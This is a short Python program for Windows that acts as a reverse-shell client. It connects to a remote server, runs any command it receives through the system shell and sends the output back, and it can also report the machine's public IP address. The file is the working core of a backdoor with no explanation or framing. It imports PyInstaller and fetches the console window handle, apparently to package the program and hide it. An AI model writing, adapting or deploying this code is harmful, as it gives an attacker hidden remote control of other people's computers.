import pyinstaller
import socket
import subprocess
import requests
import ctypes
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    
    while True:
        command = client.recv(1024).decode()
        print(f"[COMMAND RECEIVED] {command}")
        
        if command.lower() == "exit":
            break
            
        # Handle getip command
        elif command.lower() == "getip":
            try:
                r = requests.get("https://api64.ipify.org")
                response = r.json()
                output = response['ip']
                client.send(output.encode())
            except Exception as e:
                client.send(f"Error getting IP: {str(e)}".encode())
                
        # Handle open notepad command
        elif command.lower().startswith("notepad"):
            try:
                args = command.split()
                if len(args) > 1:
                    file_path = args[1]
                    subprocess.run(["notepad.exe", file_path])
                    client.send(f"Notepad opened with file: {file_path}".encode())
                else:
                    subprocess.run(["notepad.exe"])
                    client.send("Notepad opened".encode())
            except Exception as e:
                client.send(f"Error opening file: {str(e)}".encode())
                
        # Handle other commands
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client.send(output)
            except subprocess.CalledProcessError as e:
                client.send(e.output)
            except Exception as e:
                client.send(f"Error executing command: {str(e)}".encode())
                
    client.close()

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 5555
    start_client(SERVER_IP, SERVER_PORT)